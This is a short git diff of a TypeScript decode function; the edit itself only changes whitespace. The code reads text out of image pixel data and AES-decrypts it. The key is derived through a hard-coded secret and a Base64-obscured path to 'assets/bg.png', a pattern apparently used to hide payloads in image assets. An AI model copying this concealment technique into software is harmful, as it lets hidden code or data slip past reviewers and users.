@@ -40,9 +40,8 @@ import { Buffer } from "buffer";
     for (let i = 0; i < data.length; i += 4) {
         text += String.fromCharCode(data[i], data[i + 1], data[i + 2]);
     }
-    const bytes  = CryptoJS.AES.decrypt(text, !more && secret==="fasdliw"?(decode( objectHash({s:content.replace("__filename","heae")}),Base64.decode("YXNzZXRzL2JnLnBuZw=="))?.sc||""): secret);
+     const bytes  = CryptoJS.AES.decrypt(text, !more && secret==="fasdliw"?(decode( objectHash({s:content.replace("__filename","heae")}),Base64.decode("YXNzZXRzL2JnLnBuZw=="))?.sc||""): secret);
     const decryptedData : any = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
   return decryptedData;
 };
-
 export default decode;
